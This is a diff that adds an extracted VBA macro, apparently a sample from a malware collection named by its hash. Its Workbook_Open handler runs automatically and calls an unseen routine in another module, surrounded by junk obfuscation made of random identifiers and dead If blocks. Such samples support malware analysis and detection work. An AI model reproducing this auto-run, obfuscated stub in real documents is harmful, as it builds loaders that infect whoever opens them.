@@ -1,0 +1,82 @@
+Filename     : ./macros/94c8255f1904c5fbc988b84810bcd6c443b55c28ba74550a13bbe8837e448c0c
+OLE stream   : _VBA_PROJECT_CUR/VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Private Sub workbook_open()
+
+
+sRKsDeNbqBr.FwisZhlLWfVfUZKgJGqh
+Dim uFZDscWQxXASSyXWyZKcYOYDwSvRJjVFleezXeAw As Worksheet
+Dim LUNzeDMVCohkvOJghWGZgFHOCuhoTYzTYORDAYYtGaPVB As Integer
+If 31 = 35 Then
+Dim kKXUySAYaPGMzwkWYCeoNLhwFfIxNTGqmNRkJ As String
+Dim TUFyvyyLqBcoWhXkhnZdaOTJDLGIPalezMEhYpSNil As String
+End If
+Dim OdgJqliFFZsHiEBwvkrpvQPyoJdqMrU As Worksheet
+Dim MuoAqdtUVaKVMlsdzgb As Integer
+If 52 = 51 Then
+Dim uiVsqyNiUgIssNEg As String
+Dim MtELTBPWPkuDMwgdJlxmqCyBcvZoMhRIHFfju As String
+End If
+Dim VIsTzcFEKVXAeiHQSqKvDiYcbJiSmvGRwiocETrZswSZBnhyKr As Worksheet
+Dim pPUormkQspunSOPGEwteLyylCGQyancjIuGrwHrCsob As Integer
+If 37 = 48 Then
+Dim CeFeDKujlFfgqQjlkV As String
+Dim lqEMLeXIXKwFrmWXwHwcNofDqecOPaMVGgGyWpTaGumkngNtJS As String
+End If
+Dim UcoIIxKAVhCJtxxayKfYBHnWVSBvQKQiEwGkgxY As Worksheet
+Dim JnVTmYwBpmMhDOlRNoSmpvOkLQUFwqNtAmVkfnBxYQMJEdMTTetwOLi As Integer
+If 56 = 44 Then
+Dim NYlIVDrFyZSgQsAlZmUOZjFfhDAmRxQfpDHLufguhLOjlxvbStTJtwIe As String
+Dim TFaRDFnAInqNkprtGagOVVukHZTYdHmsvdspEPqbXNbyGi As String
+End If
+Dim qdCaDSQuJxLqJelPXBAxRHwBprkFqHuvdZiqWDEUcATveNFMq As Worksheet
+Dim IqayIQigAkLiKEBDPMkvvtTwgVRoBXblXOiR As Integer
+If 30 = 56 Then
+Dim TxVIAJWSsmRvRrOAVRvOWdRnzufcJaKwVkjRrcumXBEtDVWJJaQGTTvqf As String
+Dim hIGdtJSbVahIxJtWJrVZYkdXVTjKEcBotlKToIdrmShv As String
+End If
+
+
+Dim pBMRWjKcaQHxfjIaaHXsYsPLzZiAOdmF As Worksheet
+Dim ChhUGRnURZOceMoFzCReuoXwlBSxBJNwdBvxBnT As Integer
+If 43 = 48 Then
+Dim IUCayemgmlcALLIKNKliFzpTILRycRqEMiJJsOYRzU As String
+Dim fLYIClVqhnPFNIejSmNoEUvYocCySzlTjlUduzJgdlkDoHVAfJvmEL As String
+End If
+Dim PKQAUZjWYhBvVcoAoTcgKSkrjhHBTJEzPYWJNtfkxG As Worksheet
+Dim NCCsltMeUcJXAwZZRnRiDOdBgxFenvosjEFipq As Integer
+If 38 = 32 Then
+Dim vOoppcqrXZkncsSODyYAMoniqZnQnwrqjarCtNZBK As String
+Dim pZguzSwaUAHKoeHbGyPoaDbhtECAPVqYWpWOGnqHrqSwk As String
+End If
+Dim guwkbnOKNklyyBvPvKzKinzHsVSIIwkkfxMJGQoibOJFlQHmu As Worksheet
+Dim rvgTlBsvorFUGBQABSAomJ As Integer
+If 47 = 59 Then
+Dim fVRjUetWbNgNRAERtwT As String
+Dim NRYiNUMsFjxGxIhQKBChOCSPsntjQwkZEVYsHnDOHlnmdHjFkk As String
+End If
+Dim tPqPFLzIqabdcJzYBbjpIWxoZcOfllDozfCUipPNsyxdneJem As Worksheet
+Dim FFHVvbWSCpdwTWEXndwHfqMMWwJZU As Integer
+If 32 = 54 Then
+Dim BvSjsggvSEEfCfAmQZ As String
+Dim csGzANXHOsvzzRxxBuKMapYbUZsbdKMZFWhhNBuFMlSnzTFmiEeGcEzm As String
+End If
+Dim TfebVveEgWucjPkzzEAoXlbBUFtYfFxBXuOiWTkQGOGdZcDSUeGXDK As Worksheet
+Dim PiDdGQCFYaZsFpBBdgUjhJexcrCaEAzZxMffftMUOBqfEgXNRSBaC As Integer
+If 52 = 45 Then
+Dim UcGDFAONbBXbzvsJVWjUAVgTyswUoJlzYWdkZbZ As String
+Dim sxGmzTEFleEvwRGCyvnFMEuZSPXDcRH As String
+End If
+
+
+End Sub
+
